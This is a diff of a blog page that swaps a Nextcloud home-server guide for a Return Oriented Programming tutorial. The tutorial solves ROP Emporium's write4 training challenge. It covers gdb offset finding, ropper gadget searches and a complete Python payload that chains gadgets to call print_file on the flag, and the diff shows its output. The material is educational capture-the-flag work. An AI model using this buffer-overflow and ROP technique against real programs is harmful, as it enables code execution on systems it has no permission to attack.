@@ -11,7 +11,7 @@
 
   <title>
     
-      Creating a Nextcloud Server &middot; Nihaal Prasad
+      Return Oriented Programming Tutorial &middot; Nihaal Prasad
     
   </title>
 
@@ -184,7 +184,7 @@
 
     <main class="container">
       <div class="content">
-  <h1 class="page-heading">Creating a Nextcloud Server</h1>
+  <h1 class="page-heading">Return Oriented Programming Tutorial</h1>
   <div class="post-meta">
   <span class="post-categories">
     
@@ -193,57 +193,352 @@
 
   <hr>
   <div class="post-body">
-    <p>Today, I’m going to be going over how I built a Nextcloud Server on my home network. <a href="https://nextcloud.com/">Nextcloud</a> is a program that provides basic file-sharing services, but what makes it different from other file-sharing software (like Google Drive or Dropbox) is the fact that it is open-source and hosted on your own devices. Since all of the software is open-source and you own all of the hardware, you know exactly where your data is going, which prevents a company like Google from peering into your files.</p>
+    <p>In this blog post, I will be explaining how you can make use of Return Oriented Programming (ROP) gadgets in order to obtain execute code when NX is enabled. I will also be solving one of ROP Emporium’s challenges by using a ROP chain.</p>
 
-<p>I first started the process by installing a fresh version of Ubuntu on my Desktop. I then ran the command shown below to download the Nextcloud package.</p>
+<h3 id="what-is-nx">What is NX?</h3>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo snap install nextcloud
+<p>The NX bit stands for the “no-execute” bit, and it allows computers to mark certain sections of code as executable or non executable. If the process attempts to execute code that is marked as executable, then there will be no problems, but if the process attempts to execute code that is marked as non-executable, then the processor will refuse to execute that line of code.</p>
+
+<p>In a typical stack overflow, the attacker “injects” shellcode into the stack, and then he/she overwrites the return address on the stack with a JMP RSP instruction. However, when NX is enabled, the stack is typically marked as non-executable, which means that we cannot simply place shellcode on the stack.</p>
+
+<h3 id="what-are-rop-chains">What are ROP Chains?</h3>
+
+<p>Suppose we have a binary with NX enabled, and we have already figured out how to overwrite the return address and control RIP via buffer overflow. ROP chains will allow us to get around the problems that NX cause. The way this works is, we will make RIP point to a line of assembly code that is marked as executable in the binary instead of simply injecting our shellcode into the running process.</p>
+
+<p>Since we have complete control over RIP, we can theoretically make the program jump to any address in the binary, but we will want to specifcally focus on finding one or a few lines of code in the program that end with a RET instruction. These lines of code will be referred to as a “ROP gadget.” Since each ROP gadget ends with a RET instruction, and since we can overwrite the return address multiple times, we can “chain” multiple ROP gadgets together to execute the code that we want.</p>
+
+<p>Don’t worry if this doesn’t really make sense to you yet. It will make more sense when you look at an example.</p>
+
+<h3 id="a-basic-example">A Basic Example</h3>
+
+<p>I will be using <a href="https://ropemporium.com/challenge/write4.html">ROP Emporium’s Write4 Challenge</a> in 64-bit as our target. When we run the target, we are given the following:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./write4 
+write4 by ROP Emporium
+x86_64
+
+Go ahead and give me the input already!
+
+<span class="o">&gt;</span> AAAAAAAAAAAAAAA
+Thank you!
 </code></pre></div></div>
 
-<p>From there, I created a login account for my Nextcloud web interface.</p>
+<p>We are able to overwrite the return address of the target after writing 40 bytes via buffer overflow.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo nextcloud.manual-install [username] [password]
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s2">"print('A'*40 + 'BBBBBBBB')"</span> <span class="o">&gt;</span> input
+<span class="nv">$ </span>gdb write4 
+GNU gdb <span class="o">(</span>Ubuntu 9.2-0ubuntu1~20.04<span class="o">)</span> 9.2
+Copyright <span class="o">(</span>C<span class="o">)</span> 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type <span class="s2">"show copying"</span> and <span class="s2">"show warranty"</span> <span class="k">for </span>details.
+This GDB was configured as <span class="s2">"x86_64-linux-gnu"</span><span class="nb">.</span>
+Type <span class="s2">"show configuration"</span> <span class="k">for </span>configuration details.
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+
+For <span class="nb">help</span>, <span class="nb">type</span> <span class="s2">"help"</span><span class="nb">.</span>
+Type <span class="s2">"apropos word"</span> to search <span class="k">for </span>commands related to <span class="s2">"word"</span>...
+GEF <span class="k">for </span>linux ready, <span class="nb">type</span> <span class="sb">`</span>gef<span class="s1">' to start, `gef config'</span> to configure
+78 commands loaded <span class="k">for </span>GDB 9.2 using Python engine 3.8
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 2 commands could not be loaded, run <span class="sb">`</span>gef missing<span class="sb">`</span> to know why.
+/home/n/.gdbinit:2: Error <span class="k">in </span>sourced <span class="nb">command </span>file:
+<span class="nb">source command </span>requires file name of file to source.
+Reading symbols from write4...
+<span class="o">(</span>No debugging symbols found <span class="k">in </span>write4<span class="o">)</span>
+gef➤  r &lt; input
+Starting program: /home/n/Documents/Exploitation/ropemporium/write4/write4 &lt; input
+write4 by ROP Emporium
+x86_64
+
+Go ahead and give me the input already!
+
+<span class="o">&gt;</span> Thank you!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7dc7942 <span class="k">in </span>pwnme <span class="o">()</span> from ./libwrite4.so
+<span class="o">[</span> Legend: Modified register | Code | Heap | Stack | String <span class="o">]</span>
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+<span class="nv">$rax</span>   : 0xb               
+<span class="nv">$rbx</span>   : 0x0000000000400630  →  &lt;__libc_csu_init+0&gt; push r15
+<span class="nv">$rcx</span>   : 0x00007ffff7cbf1e7  →  0x5177fffff0003d48 <span class="o">(</span><span class="s2">"H="</span>?<span class="o">)</span>
+<span class="nv">$rdx</span>   : 0x0               
+<span class="nv">$rsp</span>   : 0x00007fffffffdd98  →  <span class="s2">"BBBBBBBB"</span>
+<span class="nv">$rbp</span>   : 0x4141414141414141 <span class="o">(</span><span class="s2">"AAAAAAAA"</span>?<span class="o">)</span>
+<span class="nv">$rsi</span>   : 0x00007ffff7d9a723  →  0xd9c4c0000000000a
+<span class="nv">$rdi</span>   : 0x00007ffff7d9c4c0  →  0x0000000000000000
+<span class="nv">$rip</span>   : 0x00007ffff7dc7942  →  &lt;pwnme+152&gt; ret 
+<span class="nv">$r8</span>    : 0xb               
+<span class="nv">$r9</span>    : 0x2               
+<span class="nv">$r10</span>   : 0x00007ffff7dc74c9  →  0x6972700064616572 <span class="o">(</span><span class="s2">"read"</span>?<span class="o">)</span>
+<span class="nv">$r11</span>   : 0x246             
+<span class="nv">$r12</span>   : 0x0000000000400520  →  &lt;_start+0&gt; xor ebp, ebp
+<span class="nv">$r13</span>   : 0x00007fffffffde90  →  0x0000000000000001
+<span class="nv">$r14</span>   : 0x0               
+<span class="nv">$r15</span>   : 0x0               
+<span class="nv">$eflags</span>: <span class="o">[</span>ZERO carry PARITY adjust sign <span class="nb">trap </span>INTERRUPT direction overflow RESUME virtualx86 identification]
+<span class="nv">$cs</span>: 0x0033 <span class="nv">$ss</span>: 0x002b <span class="nv">$ds</span>: 0x0000 <span class="nv">$es</span>: 0x0000 <span class="nv">$fs</span>: 0x0000 <span class="nv">$gs</span>: 0x0000 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffdd98│+0x0000: <span class="s2">"BBBBBBBB"</span>	 ← <span class="nv">$rsp</span>
+0x00007fffffffdda0│+0x0008: 0x000000000000000a
+0x00007fffffffdda8│+0x0010: 0x00007ffff7bd50b3  →  &lt;__libc_start_main+243&gt; mov edi, eax
+0x00007fffffffddb0│+0x0018: 0x00007ffff7ffc620  →  0x0005043c00000000
+0x00007fffffffddb8│+0x0020: 0x00007fffffffde98  →  0x00007fffffffe21b  →  <span class="s2">"/home/n/Documents/Exploitation/ropemporium/write4/[...]"</span>
+0x00007fffffffddc0│+0x0028: 0x0000000100000000
+0x00007fffffffddc8│+0x0030: 0x0000000000400607  →  &lt;main+0&gt; push rbp
+0x00007fffffffddd0│+0x0038: 0x0000000000400630  →  &lt;__libc_csu_init+0&gt; push r15
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7ffff7dc793b &lt;pwnme+145&gt;      call   0x7ffff7dc7730 &lt;puts@plt&gt;
+   0x7ffff7dc7940 &lt;pwnme+150&gt;      nop    
+   0x7ffff7dc7941 &lt;pwnme+151&gt;      leave  
+ → 0x7ffff7dc7942 &lt;pwnme+152&gt;      ret    
+<span class="o">[!]</span> Cannot disassemble from <span class="nv">$PC</span>
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+<span class="o">[</span><span class="c">#0] Id 1, Name: "write4", stopped, reason: SIGSEGV</span>
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+<span class="o">[</span><span class="c">#0] 0x7ffff7dc7942 → pwnme()</span>
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤ 
 </code></pre></div></div>
 
-<p>It is also necessary to add IP addresses/domain names to the trusted_domains array. I simply did this once to add my private IP address to the array, but if there were more IP addresses/domain names associated with my server, I would have to use the below command multiple times to add all of them.</p>
+<p>By looking at the Rop Emporium website, we see that we are given the following information:</p>
+<ul>
+  <li>There is a function called <code class="highlighter-rouge">print_file(char* filename)</code>.</li>
+  <li>This function has been moved into a separate library, but a PLT entry for that function exists in the binary.</li>
+  <li>Our goal is to call <code class="highlighter-rouge">print_file("flag.txt")</code>.</li>
+  <li>You can input NULL bytes into the program, and the program will read them just fine.</li>
+</ul>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo nextcloud.occ config:system:set trusted_domains 1 --value=[insert IP or domain name here]
+<p>Note that NX is enabled, so we can’t just execute a <code class="highlighter-rouge">JMP RSP</code> instruction and put shellcode on the stack.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rabin2 <span class="nt">-I</span> write4
+<span class="nb">arch     </span>x86
+baddr    0x400000
+binsz    6521
+bintype  elf
+bits     64
+canary   <span class="nb">false
+</span>class    ELF64
+compiler GCC: <span class="o">(</span>Ubuntu 7.5.0-3ubuntu1~18.04<span class="o">)</span> 7.5.0
+crypto   <span class="nb">false
+</span>endian   little
+havecode <span class="nb">true
+</span>intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  <span class="nb">true
+</span>lsyms    <span class="nb">true
+</span>machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       <span class="nb">true
+</span>os       linux
+pcalign  0
+pic      <span class="nb">false
+</span>relocs   <span class="nb">true
+</span>relro    partial
+rpath    <span class="nb">.</span>
+sanitiz  <span class="nb">false
+</span>static   <span class="nb">false
+</span>stripped <span class="nb">false
+</span>subsys   linux
+va       <span class="nb">true</span>
 </code></pre></div></div>
 
-<p>If I were to expose this to the internet, I would have used a certificate authority to generate an SSL certificate for me so that the identity of my server would be validated in my web browser. However, since I am just going to be using this service on my home network, I just generated a self-signed certificate. Note that doing this will make a warning appear whenever someone connects to the web interface.</p>
+<p>The <code class="highlighter-rouge">print_file(char *filename)</code> function, as we can see using rabin2, has a PLT entry that is located at <code class="highlighter-rouge">0x00400510</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rabin2 <span class="nt">-i</span> write4
+<span class="o">[</span>Imports]
+nth vaddr      <span class="nb">bind   type   </span>name
+―――――――――――――――――――――――――――――――――
+1   0x00400500 GLOBAL FUNC   pwnme
+2   0x00000000 GLOBAL FUNC   __libc_start_main
+3   0x00000000 WEAK   NOTYPE __gmon_start__
+4   0x00400510 GLOBAL FUNC   print_file
+</code></pre></div></div>
+<p>This means that we have two steps that we need to accomplish:</p>
+<ol>
+  <li>Load a pointer to the string “flag.txt” into RDI (in x86-64, RDI contains the first argument to a function).</li>
+  <li>Overwrite the return address with <code class="highlighter-rouge">0x00400510</code> to call <code class="highlighter-rouge">print_file("flag.txt")</code>.</li>
+</ol>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo nextcloud.enable-https self-signed
+<p>Unfortunately, there are no useful strings in the binary. This means that we need to somehow inject the “flag.txt” string into the process.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rabin2 <span class="nt">-z</span> write4
+<span class="o">[</span>Strings]
+nth paddr      vaddr      len size section <span class="nb">type  </span>string
+―――――――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x000006b4 0x004006b4 11  12   .rodata ascii nonexistent
 </code></pre></div></div>
 
-<p>I also enabled a firewall and opened the necessary ports.</p>
+<h3 id="writing-the-string">Writing the String</h3>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo ufw allow 80,443/tcp
-$ sudo ufw enable
+<p>Using rabin2, we can see that there are several writeable sections in the binary. We can write our “flag.txt” string in the <code class="highlighter-rouge">.data</code> section, which is writeable and is located at <code class="highlighter-rouge">0x00601028</code>. Theoretically, the <code class="highlighter-rouge">.bss</code> section should also work just fine.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rabin2 <span class="nt">-S</span> write4
+<span class="o">[</span>Sections]
+
+nth paddr        size vaddr       vsize perm name
+―――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x00000000    0x0 0x00000000    0x0 <span class="nt">----</span> 
+1   0x00000238   0x1c 0x00400238   0x1c <span class="nt">-r--</span> .interp
+2   0x00000254   0x20 0x00400254   0x20 <span class="nt">-r--</span> .note.ABI_tag
+3   0x00000274   0x24 0x00400274   0x24 <span class="nt">-r--</span> .note.gnu.build_id
+4   0x00000298   0x38 0x00400298   0x38 <span class="nt">-r--</span> .gnu.hash
+5   0x000002d0   0xf0 0x004002d0   0xf0 <span class="nt">-r--</span> .dynsym
+6   0x000003c0   0x7c 0x004003c0   0x7c <span class="nt">-r--</span> .dynstr
+7   0x0000043c   0x14 0x0040043c   0x14 <span class="nt">-r--</span> .gnu.version
+8   0x00000450   0x20 0x00400450   0x20 <span class="nt">-r--</span> .gnu.version_r
+9   0x00000470   0x30 0x00400470   0x30 <span class="nt">-r--</span> .rela.dyn
+10  0x000004a0   0x30 0x004004a0   0x30 <span class="nt">-r--</span> .rela.plt
+11  0x000004d0   0x17 0x004004d0   0x17 <span class="nt">-r-x</span> .init
+12  0x000004f0   0x30 0x004004f0   0x30 <span class="nt">-r-x</span> .plt
+13  0x00000520  0x182 0x00400520  0x182 <span class="nt">-r-x</span> .text
+14  0x000006a4    0x9 0x004006a4    0x9 <span class="nt">-r-x</span> .fini
+15  0x000006b0   0x10 0x004006b0   0x10 <span class="nt">-r--</span> .rodata
+16  0x000006c0   0x44 0x004006c0   0x44 <span class="nt">-r--</span> .eh_frame_hdr
+17  0x00000708  0x120 0x00400708  0x120 <span class="nt">-r--</span> .eh_frame
+18  0x00000df0    0x8 0x00600df0    0x8 <span class="nt">-rw-</span> .init_array
+19  0x00000df8    0x8 0x00600df8    0x8 <span class="nt">-rw-</span> .fini_array
+20  0x00000e00  0x1f0 0x00600e00  0x1f0 <span class="nt">-rw-</span> .dynamic
+21  0x00000ff0   0x10 0x00600ff0   0x10 <span class="nt">-rw-</span> .got
+22  0x00001000   0x28 0x00601000   0x28 <span class="nt">-rw-</span> .got.plt
+23  0x00001028   0x10 0x00601028   0x10 <span class="nt">-rw-</span> .data
+24  0x00001038    0x0 0x00601038    0x8 <span class="nt">-rw-</span> .bss
+25  0x00001038   0x29 0x00000000   0x29 <span class="nt">----</span> .comment
+26  0x00001068  0x618 0x00000000  0x618 <span class="nt">----</span> .symtab
+27  0x00001680  0x1f6 0x00000000  0x1f6 <span class="nt">----</span> .strtab
+28  0x00001876  0x103 0x00000000  0x103 <span class="nt">----</span> .shstrtab
 </code></pre></div></div>
 
-<p>That’s it! Once all of that was completed, I was able to access the web interface by typing in my server’s IP address in the web browser. After typing in the username and password I set earlier, I was able to upload/download files to my file server.</p>
+<p>“flag.txt” written as a Python byte array is <code class="highlighter-rouge">b'\x66\x6c\x61\x67\x2e\x74\x78\x74'</code>.</p>
 
-<p><img src="../../../assets/img/2019-8-24-nextcloud-server/nextcloud_interface.png" /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python
+Python 3.8.5 <span class="o">(</span>default, Jul 28 2020, 12:59:40<span class="o">)</span> 
+<span class="o">[</span>GCC 9.3.0] on linux
+Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
+<span class="o">&gt;&gt;&gt;</span> a <span class="o">=</span> <span class="s2">"flag.txt"</span>
+<span class="o">&gt;&gt;&gt;</span> a.encode<span class="o">(</span><span class="nv">encoding</span><span class="o">=</span><span class="s1">'utf-8'</span><span class="o">)</span>.hex<span class="o">()</span>
+<span class="s1">'666c61672e747874'</span>
+</code></pre></div></div>
+
+<p>Now we know that we need to write the bytes <code class="highlighter-rouge">0x66 0x6c 0x61 0x67 0x2e 0x74 0x78 0x74</code> (“flag.txt” written in hex) at memory location <code class="highlighter-rouge">0x00601028</code>. Alright, so how do we actually accomplish this? The first step would be to search for some code in the binary that is in the form <code class="highlighter-rouge">mov [%], %; ret</code>. If we could find code that does this, then we could write the hex bytes for “flag.txt” at memory location <code class="highlighter-rouge">0x00601028</code> by modifying the registers accordingly and jumping to that line of code.</p>
+
+<p>We can find a line of code in this form by using a tool called ropper. Ropper allows us to easily find ROP gadgets in binaries that we can use.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ropper <span class="nt">--file</span> write4 <span class="nt">--search</span> <span class="s2">"mov [%], %; ret"</span>
+<span class="o">[</span>INFO] Load gadgets from cache
+<span class="o">[</span>LOAD] loading... 100%
+<span class="o">[</span>LOAD] removing double gadgets... 100%
+<span class="o">[</span>INFO] Searching <span class="k">for </span>gadgets: mov <span class="o">[</span>%], %<span class="p">;</span> ret
+
+<span class="o">[</span>INFO] File: write4
+0x00000000004005e2: mov byte ptr <span class="o">[</span>rip + 0x200a4f], 1<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
+0x0000000000400606: mov dword ptr <span class="o">[</span>rbp + 0x48], edx<span class="p">;</span> mov ebp, esp<span class="p">;</span> call 0x500<span class="p">;</span> mov eax, 0<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
+0x0000000000400629: mov dword ptr <span class="o">[</span>rsi], edi<span class="p">;</span> ret<span class="p">;</span> 
+0x0000000000400628: mov qword ptr <span class="o">[</span>r14], r15<span class="p">;</span> ret<span class="p">;</span>
+</code></pre></div></div>
+
+<p>The <code class="highlighter-rouge">mov qword ptr [r14], r15; ret</code> at line <code class="highlighter-rouge">0x0000000000400628</code> seems perfect for us! Now, we just need to find a way to modify the registers so that <code class="highlighter-rouge">r14</code> is equal to <code class="highlighter-rouge">0x00601028</code> and <code class="highlighter-rouge">r15</code> is equal to <code class="highlighter-rouge">0x666c61672e747874</code>. We could do this by searching for a <code class="highlighter-rouge">pop r14</code> instruction and a <code class="highlighter-rouge">pop r15</code> instruction.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ropper <span class="nt">--file</span> write4 <span class="nt">--search</span> <span class="s2">"pop r14%; ret"</span>
+<span class="o">[</span>INFO] Load gadgets from cache
+<span class="o">[</span>LOAD] loading... 100%
+<span class="o">[</span>LOAD] removing double gadgets... 100%
+<span class="o">[</span>INFO] Searching <span class="k">for </span>gadgets: pop r14%<span class="p">;</span> ret
+
+<span class="o">[</span>INFO] File: write4
+0x0000000000400690: pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span>
+</code></pre></div></div>
+
+<p>Luckily for us, in this scenario the <code class="highlighter-rouge">pop r14</code> and <code class="highlighter-rouge">pop r15</code> instructions were right next to each other. This means that we can put both of their values on the stack without needing another ROP gadget (recall that since our input buffer is on the stack, we can add more and more addresses on the stack).</p>
+
+<p>So far, our stack buffer overflow should look like this:</p>
+<ul>
+  <li>“A” written 40 times.</li>
+  <li><code class="highlighter-rouge">0x0000000000400690</code>, which will make the program jump to the <code class="highlighter-rouge">pop r14; pop r15; ret</code> instructions.</li>
+  <li><code class="highlighter-rouge">0x0000000000601028</code>, which will set <code class="highlighter-rouge">r14</code> to the memory location where we are writing our string.</li>
+  <li><code class="highlighter-rouge">0x666c61672e747874</code>, which will set <code class="highlighter-rouge">r15</code> to “flag.txt” written in ASCII.</li>
+  <li><code class="highlighter-rouge">0x0000000000400628</code>, which will jump to the <code class="highlighter-rouge">mov qword ptr [r14], r15; ret;</code> instruction after we have set <code class="highlighter-rouge">r14</code> and <code class="highlighter-rouge">r15</code>.</li>
+</ul>
+
+<p>This gives us the following input (which won’t work yet).</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">"import sys; sys.stdout.buffer.write(b'A'*40 + b'</span><span class="se">\x90\x06\x40\x00\x00\x00\x00\x00</span><span class="s">' + b'</span><span class="se">\x28\x10\x60\x00\x00\x00\x00\x00</span><span class="s">' + b'</span><span class="se">\x66\x6c\x61\x67\x2e\x74\x78\x74</span><span class="s">' + b'</span><span class="se">\x28\x06\x40\x00\x00\x00\x00\x00</span><span class="s">')"</span> <span class="o">|</span> <span class="o">./</span><span class="n">write4</span>
+</code></pre></div></div>
+
+<p>In case you still don’t understand why this works, here is what is actually going on:</p>
+<ol>
+  <li>Because of the buffer overflow, RIP is overwritten with <code class="highlighter-rouge">0x0000000000400690</code>, which is the location of the <code class="highlighter-rouge">pop r14; pop r15; ret</code> ROP gadget.</li>
+  <li>When <code class="highlighter-rouge">pop r14</code> is executed, we will get <code class="highlighter-rouge">0x0000000000601028</code> in <code class="highlighter-rouge">r14</code>.</li>
+  <li>When <code class="highlighter-rouge">pop r15</code> is executed, we will get <code class="highlighter-rouge">0x666c61672e747874</code> in <code class="highlighter-rouge">r15</code>.</li>
+  <li>After that, <code class="highlighter-rouge">0x0000000000400628</code> is on the stack, which means that the <code class="highlighter-rouge">RET</code> instruction will jump to that location.</li>
+  <li>The next ROP gadget that we execute contains <code class="highlighter-rouge">mov qword ptr [r14], r15;</code>, which moves our copies our string into the location that <code class="highlighter-rouge">r14</code> points to.</li>
+</ol>
+
+<p>We still need to do the following for the exploit to work:</p>
+<ol>
+  <li>Set <code class="highlighter-rouge">rdi</code> to <code class="highlighter-rouge">0x00601028</code> (recall that the first parameter to a function is in <code class="highlighter-rouge">rdi</code> for x86-64 binaries)</li>
+  <li>Jump to <code class="highlighter-rouge">print_file()</code></li>
+</ol>
+
+<h3 id="calling-the-function">Calling the Function</h3>
+
+<p>Using ropper, we can find a way for us to modify <code class="highlighter-rouge">rdi</code> the same way we modified <code class="highlighter-rouge">r14</code> and <code class="highlighter-rouge">r15</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ropper <span class="nt">--file</span> write4 <span class="nt">--search</span> <span class="s2">"pop rdi; ret"</span>
+<span class="o">[</span>INFO] Load gadgets from cache
+<span class="o">[</span>LOAD] loading... 100%
+<span class="o">[</span>LOAD] removing double gadgets... 100%
+<span class="o">[</span>INFO] Searching <span class="k">for </span>gadgets: pop rdi<span class="p">;</span> ret
+
+<span class="o">[</span>INFO] File: write4
+0x0000000000400693: pop rdi<span class="p">;</span> ret<span class="p">;</span>
+</code></pre></div></div>
+
+<p>If we jump to this ROP gadget and add <code class="highlighter-rouge">0x0000000000601028</code> onto the stack, then when the <code class="highlighter-rouge">pop rdi</code> instruction is executed, we will have <code class="highlighter-rouge">rdi</code> point to the location of our string. From there, we can add <code class="highlighter-rouge">0x0000000000400510</code> to the stack, which is the location of the PLT entry for <code class="highlighter-rouge">print_file(char *filename)</code>. When the <code class="highlighter-rouge">RET</code> instruction is executed, we will call <code class="highlighter-rouge">print_file("flag.txt")</code>, which will solve the problem!</p>
+
+<p>Our stack should now look like the following:</p>
+<ul>
+  <li>“A” written 40 times.</li>
+  <li><code class="highlighter-rouge">0x0000000000400690</code>, which will make the program jump to the <code class="highlighter-rouge">pop r14; pop r15; ret</code> instructions.</li>
+  <li><code class="highlighter-rouge">0x0000000000601028</code>, which will set <code class="highlighter-rouge">r14</code> to the memory location where we are writing our string.</li>
+  <li><code class="highlighter-rouge">0x666c61672e747874</code>, which will set <code class="highlighter-rouge">r15</code> to “flag.txt” written in ASCII.</li>
+  <li><code class="highlighter-rouge">0x0000000000400628</code>, which will jump to the <code class="highlighter-rouge">mov qword ptr [r14], r15; ret;</code> instruction after we have set <code class="highlighter-rouge">r14</code> and <code class="highlighter-rouge">r15</code>.</li>
+  <li><code class="highlighter-rouge">0x0000000000400693</code>, which will jump to the <code class="highlighter-rouge">pop rdi; ret</code> instruction.</li>
+  <li><code class="highlighter-rouge">0x0000000000601028</code>, which will set <code class="highlighter-rouge">rdi</code> to the memory location where we wrote our string.</li>
+  <li><code class="highlighter-rouge">0x0000000000400510</code>, which will execute <code class="highlighter-rouge">print_file("flag.txt")</code></li>
+</ul>
+
+<p>This gives us the following:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s2">"import sys; sys.stdout.buffer.write(b'A'*40 + b'</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00' + b'</span><span class="se">\x</span><span class="s2">28</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00' + b'</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">67</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">78</span><span class="se">\x</span><span class="s2">74' + b'</span><span class="se">\x</span><span class="s2">28</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00' + b'</span><span class="se">\x</span><span class="s2">93</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00' + b'</span><span class="se">\x</span><span class="s2">28</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00' + b'</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00')"</span> | ./write4 
+write4 by ROP Emporium
+x86_64
+
+Go ahead and give me the input already!
+
+<span class="o">&gt;</span> Thank you!
+ROPE<span class="o">{</span>a_placeholder_32byte_flag!<span class="o">}</span>
+</code></pre></div></div>
+
+<p>This will successfully execute our ROP chain and print out our flag!</p>
 
 <section class="related">
   <h3 style="color: black">Related Posts</h3>
   <ul class="post-list">
     
       <li style="color: black; font-size: 9;">
-        <a href="/2019/06/15/pi-hole-ad-blocker.html">
-          Network-wide Ad Blocking Using Pi-hole
+        <a href="/2020/07/21/pentesting-greenoptic-1.html">
+          Pentesting GreenOptic: 1
         </a>
       </li>
     
       <li style="color: black; font-size: 9;">
-        <a href="/2019/03/11/solving-a-basic-crackme-using-ghidra.html">
-          Solving a Basic Crackme Using Ghidra
+        <a href="/2020/03/27/creating-a-barebones-windows-debugger.html">
+          Creating a Barebones Windows Debugger
         </a>
       </li>
     
       <li style="color: black; font-size: 9;">
-        <a href="/2019/01/25/flash-drive-that-deletes-everything.html">
-          Basic Evil Flash Drive That Deletes Linux User's Data
+        <a href="/2020/03/07/creating-a-barebones-linux-debugger.html">
+          Creating a Barebones Linux Debugger
         </a>
       </li>
     
@@ -259,8 +554,6 @@ $ sudo ufw enable
   
 </div>
   </div>
-
-  
 </div>
 
     </main>
